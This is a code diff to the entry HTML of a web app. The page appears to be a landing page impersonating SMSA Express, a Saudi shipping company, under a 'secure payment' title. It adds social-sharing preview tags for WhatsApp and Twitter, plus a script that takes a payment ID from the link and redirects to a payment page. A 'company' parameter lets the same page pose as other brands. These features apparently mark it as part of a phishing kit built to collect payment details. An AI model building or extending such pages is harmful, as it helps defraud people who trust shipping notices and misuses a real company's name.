@@ -1,25 +1,54 @@
 <!doctype html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>سمسا - SMSA | تتبع شحنتك وأكمل الدفع</title>
-    <meta name="description" content="سمسا - أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية" />
+    <title>دفع آمن - SMSA Express سمسا إكسبرس 🚛</title>
+    <meta name="description" content="SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦" />
+    
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="منصة الدفع الآمن" />
+    <meta property="og:locale" content="ar_AR" />
+    <meta property="og:title" content="دفع آمن - SMSA Express سمسا إكسبرس 🚛" />
+    <meta property="og:description" content="SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦" />
+    <meta property="og:image" content="/og-smsa.jpg" />
+    <meta property="og:image:secure_url" content="/og-smsa.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:alt" content="دفع آمن - SMSA Express سمسا إكسبرس 🚛" />
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="دفع آمن - SMSA Express سمسا إكسبرس 🚛" />
+    <meta name="twitter:description" content="SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦" />
+    <meta name="twitter:image" content="/og-smsa.jpg" />
+    <meta name="twitter:image:alt" content="دفع آمن - SMSA Express سمسا إكسبرس 🚛" />
+    
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
-    <meta property="og:title" content="سمسا - SMSA | تتبع شحنتك وأكمل الدفع" />
-    <meta property="og:description" content="سمسا - أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية" />
-    <meta property="og:image" content="/og-smsa.jpg" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="/og-smsa.jpg" />
 </head>
 <body>
-    <div id="root" style="text-align: center; padding: 100px 20px; font-family: 'Almarai', sans-serif;">
-        <h1>سمسا - SMSA</h1>
-        <p>جاري التحميل...</p>
+    <div id="root" style="display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Almarai', sans-serif;">
+        <div style="text-align: center;">
+            <h2>جاري التحويل...</h2>
+            <p>يرجى الانتظار</p>
+        </div>
     </div>
-    <script>window.location.href = window.location.origin + window.location.pathname.replace('/r/', '/r/');</script>
+    <script>
+        const service = 'smsa';
+        const urlParams = new URLSearchParams(window.location.search);
+        const payId = urlParams.get('payId') || urlParams.get('id');
+        const company = urlParams.get('company') || service;
+        
+        if (payId) {
+            window.location.href = `/pay/${payId}/recipient?service=${company}`;
+        } else {
+            window.location.href = '/';
+        }
+    </script>
     <script type="module" src="/src/main.tsx"></script>
 </body>
 </html>
